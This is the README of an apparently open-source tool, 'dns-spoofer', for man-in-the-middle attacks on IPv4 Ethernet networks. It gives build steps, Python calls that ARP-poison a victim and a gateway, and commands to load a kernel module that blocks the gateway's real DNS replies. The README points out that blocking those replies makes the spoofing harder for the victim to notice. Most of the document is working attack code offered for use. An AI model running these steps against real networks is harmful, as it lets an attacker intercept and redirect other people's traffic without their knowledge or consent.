[![Build Status](https://travis-ci.org/adw1n/dns-spoofer.svg?branch=master)](https://travis-ci.org/adw1n/dns-spoofer)
![implementation](https://img.shields.io/badge/python-3.4%2C%203.5%2C%203.6-blue.svg)
![versions](https://img.shields.io/badge/implementation-cpython-blue.svg)

Work In Progress
### About
man in the middle attacks

#### Limitations
* Ethernet II networks
* ipv4 only

#### Dependencies / requirements
* libnet-dev
* libpcap-dev
* python3-dev
* c++ compiler with c++11 support

For the "firewall" module:
* linux kernel >=4 (tested on 4.2, 4.6 and 4.9)  
For older kernels you will probably have to change some functions signatures.
### Install

```bash
git clone https://github.com/adw1n/dns-spoofer
cd dns-spoofer

# If you are going to run setup.py install, then
# I recommend using a virtualenv for this.
python setup.py build
python setup.py install # You could also add directory build/lib... to the PYTHONPATH instead.
```

### Usage
```bash
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo python  # dnsspoofer requires root privileges
```
#### ARP poisoning
```python
import dnsspoofer

# module documentation is available by:
# help(dnsspoofer)

# your mac addr:
# 33:33:33:33:33:33
# example arp -n output:
# gateway:
# 192.168.1.1     ether   10:20:30:40:50:60   C  em1
# victim:
# 192.168.1.100   ether   01:02:03:04:05:06   C  em1
dnsspoofer.spoof_arp(b"\x01\x02\x03\x04\x05\x06",b"192.168.1.1")
# now arp -n output on the victim machine:
# 192.168.1.1     ether   33:33:33:33:33:33   C  em1

# you probably also want to spoof the victim's (192.168.1.100)
# mac address on the gateway
dnsspoofer.spoof_arp(b"\x10\x20\x30\x40\x50\x60",b"192.168.1.100")
```

#### DNS poisoning
see the [example.py](example.py) file

I haven't implemented the reverse DNS lookups (.in-addr.arpa requests), but this works fine in most cases without them too.
##### Netfilter kernel module
The DNS spoofing presented in example.py works, provided that you are faster than the gateway. This might not always be the case - for example the gateway might be caching the results. In this case the first time the victim tries to ping facebook.com everything might be working as expected, but the next time he asks about facebook.com the gateway will respond immediately. This can result in your response reaching the victim too late. This is super easy to notice in wireshark.

The additional benefit of blocking gateway's reponses to the spoofed requests is that it is going to be harder to notice the spoofing going around form the victim's point of view.
##### Solution
**!!!WARNING!!!  
Badly written kernel module can screw up your system. I recommend using for this a VM. Your mileage may vary.  
!!!WARNING!!!**

```bash
cd firewall
make
modinfo dnsfirewall.ko # show info about the module


# load the module
sync && sudo insmod dnsfirewall.ko blocked_sites="wp.pl|facebook.com|youtube.com" gateway=192.168.1.1 victim=192.168.1.100
# Module writes messages to SYSLOG with prefix 'DNS-SPOOFER'.


# remove the module
sync && sudo rmmod dnsfirewall.ko
```
